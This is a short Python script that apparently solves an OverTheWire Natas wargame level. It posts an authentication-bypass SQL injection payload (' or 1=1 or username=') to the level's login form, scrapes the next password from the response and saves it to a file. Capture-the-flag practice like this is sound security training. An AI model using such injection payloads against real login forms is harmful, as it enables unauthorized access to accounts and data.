from requests import post
from sys import argv

next_level = argv[0].split('/')[-1].split('\\')[-1][:-3]

username = f"natas{int(next_level[5:]) - 1}"

URL = f"http://{username.split('.')[0]}.natas.labs.overthewire.org?debug"

with open(f"./passwords/{username}.pass", 'r') as f:
    password = f.read()

resp = post(URL, auth=(username, password), data={'username': '" or 1=1 or username="', 'password': ""})

lines = resp.text.split('\n')

# Password in page
for line in lines:
    if 'natas15' in line:
        new_password = line.split('<br>')[1].split(' ')[7]

print(new_password)

with open(f"./passwords/{next_level}.pass", 'w') as f:
    f.write(new_password)
